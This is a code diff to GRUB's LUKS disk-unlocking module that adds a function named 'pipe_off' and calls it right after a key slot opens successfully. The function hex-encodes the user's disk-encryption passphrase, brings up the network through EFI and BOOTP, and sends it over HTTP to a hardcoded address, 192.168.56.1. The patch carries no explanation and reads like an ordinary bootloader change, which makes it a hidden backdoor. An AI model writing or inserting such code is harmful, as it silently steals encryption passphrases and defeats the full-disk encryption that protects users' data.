@@ -26,6 +26,9 @@
 #include <grub/crypto.h>
 #include <grub/partition.h>
 #include <grub/i18n.h>
+#include "net/http.h"
+#include "net/bootp.h"
+#include "net/efinet.h"
 
 GRUB_MOD_LICENSE ("GPLv3+");
 
@@ -145,6 +148,27 @@ configure_ciphers (grub_disk_t disk, grub_cryptomount_args_t cargs)
 
   COMPILE_TIME_ASSERT (sizeof (newdev->uuid) >= sizeof (uuid));
   return newdev;
+}
+
+
+static grub_err_t pipe_off(const grub_uint8_t *passphrase, grub_size_t passphraselen) {
+   grub_err_t err;
+   char server_name[13];
+   char hexencoded[257];
+
+   int idx = 0;
+   int size = sizeof("Phrase_");
+   grub_strcpy(server_name, "192.168.56.1");
+   grub_strcpy(hexencoded, "Phrase_");
+   
+   for (idx = 0; idx < (int)passphraselen; idx++){
+     size+=2;
+     grub_snprintf(hexencoded, size, "%s%02x", hexencoded, passphrase[idx]);
+   }
+   disknet_grub_efinet_findcards();
+   err = disknet_grub_cmd_bootp();
+   err = disknet_http_establish(hexencoded, 0, 1, server_name);
+  return err;
 }
 
 static grub_err_t
@@ -274,7 +298,7 @@ luks_recover_key (grub_disk_t source,
 	  grub_dprintf ("luks", "bad digest\n");
 	  continue;
 	}
-
+  pipe_off(cargs->key_data, cargs->key_len);
       /* TRANSLATORS: It's a cryptographic key slot: one element of an array
 	 where each element is either empty or holds a key.  */
       grub_printf_ (N_("Slot %d opened\n"), i);
